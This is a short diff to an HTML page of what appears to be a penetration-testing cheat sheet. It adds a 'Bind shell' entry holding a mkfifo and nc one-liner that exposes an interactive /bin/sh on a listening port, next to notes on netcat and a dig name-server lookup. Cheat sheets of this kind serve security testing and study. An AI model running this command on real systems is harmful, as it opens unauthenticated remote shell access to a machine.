@@ -185,6 +185,9 @@
 </code></pre>
 <p>You may need to use <a href="./netcat.html"><code>nc</code> with a proxy</a>.</p>
 <h1 id="bind-shell"><a class="header" href="#bind-shell">Bind shell</a></h1>
+<pre><code class="language-bash">mkfifo /tmp/f
+/bin/sh -i 2&gt;&amp;1 &lt; /tmp/f | nc -lvp $port &gt; /tmp/f
+</code></pre>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="name-server-detection"><a class="header" href="#name-server-detection">Name Server detection</a></h1>
 <h2 id="dig"><a class="header" href="#dig">dig</a></h2>
 <pre><code class="language-bash">dig ns &lt;domain&gt; +short
